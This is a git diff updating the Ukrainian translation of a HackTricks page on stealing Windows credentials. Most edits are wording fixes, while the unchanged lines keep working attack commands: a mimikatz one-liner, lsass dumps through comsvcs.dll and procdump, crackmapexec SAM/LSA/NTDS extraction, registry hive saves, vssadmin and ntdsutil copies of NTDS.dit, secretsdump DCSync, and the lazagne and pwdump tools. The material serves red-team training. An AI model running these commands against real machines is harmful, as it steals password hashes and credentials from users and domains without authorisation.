@@ -1,16 +1,16 @@
-# Stealing Windows Credentials
+# Крадіжка облікових даних Windows
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Підтримка HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
 
 </details>
 {% endhint %}
@@ -29,7 +29,7 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-**Знайдіть інші можливості, які може виконати Mimikatz на** [**цій сторінці**](credentials-mimikatz.md)**.**
+**Знайдіть інші можливості, які має Mimikatz, на** [**цій сторінці**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 ```bash
@@ -110,7 +110,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 ### Витягування lsass за допомогою procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - це підписаний Microsoft двійковий файл, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - це підписаний Microsoft двійковий файл, який є частиною [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) набору.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -141,7 +141,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Витягніть NTDS.dit з цільового DC
+### Витягти NTDS.dit з цільового DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
@@ -171,13 +171,13 @@ reg save HKLM\security security
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-### Volume Shadow Copy
+### Копія тіньового тому
 
 Ви можете виконати копію захищених файлів, використовуючи цю службу. Вам потрібно бути адміністратором.
 
-#### Using vssadmin
+#### Використання vssadmin
 
-Бінарний файл vssadmin доступний лише в версіях Windows Server
+Бінарний файл vssadmin доступний лише у версіях Windows Server
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -207,7 +207,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 ```
 ## **Active Directory Credentials - NTDS.dit**
 
-Файл **NTDS.dit** відомий як серце **Active Directory**, що містить важливі дані про об'єкти користувачів, групи та їх членство. Саме тут зберігаються **хеші паролів** для доменних користувачів. Цей файл є базою даних **Extensible Storage Engine (ESE)** і знаходиться за адресою **_%SystemRoom%/NTDS/ntds.dit_**.
+Файл **NTDS.dit** відомий як серце **Active Directory**, що містить важливі дані про об'єкти користувачів, групи та їх членство. Саме тут зберігаються **хеші паролів** для доменних користувачів. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.
 
 У цій базі даних підтримуються три основні таблиці:
 
@@ -243,7 +243,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Ви також можете **автоматично витягувати їх**, використовуючи дійсного користувача адміністратора домену:
+Ви також можете **автоматично витягувати їх**, використовуючи дійсного адміністратора домену:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
@@ -257,11 +257,11 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
+The `SYSTEM` hive є необов'язковим, але дозволяє розшифровувати секрети (NT та LM хеші, додаткові облікові дані, такі як паролі у відкритому вигляді, kerberos або ключі довіри, історії паролів NT та LM). Разом з іншою інформацією, витягуються наступні дані: облікові записи користувачів та машин з їхніми хешами, прапори UAC, мітка часу останнього входу та зміни пароля, опис облікових записів, імена, UPN, SPN, групи та рекурсивні членства, дерево організаційних одиниць та членство, довірені домени з типами довіри, напрямком та атрибутами...
 
 ## Lazagne
 
-Завантажте двійковий файл з [тут](https://github.com/AlessandroZ/LaZagne/releases). ви можете використовувати цей двійковий файл для витягування облікових даних з кількох програм.
+Завантажте бінарний файл з [тут](https://github.com/AlessandroZ/LaZagne/releases). ви можете використовувати цей бінарний файл для витягування облікових даних з кількох програм.
 ```
 lazagne.exe all
 ```
@@ -280,7 +280,7 @@ fgdump.exe
 ```
 ### PwDump
 
-Витягніть облікові дані з файлу SAM
+Витягти облікові дані з файлу SAM
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
@@ -290,7 +290,7 @@ type outpwdump
 
 Завантажте його з: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) і просто **виконайте його**, і паролі будуть витягнуті.
 
-## Defenses
+## Захист
 
 [**Дізнайтеся про деякі захисти облікових даних тут.**](credentials-protections.md)
 
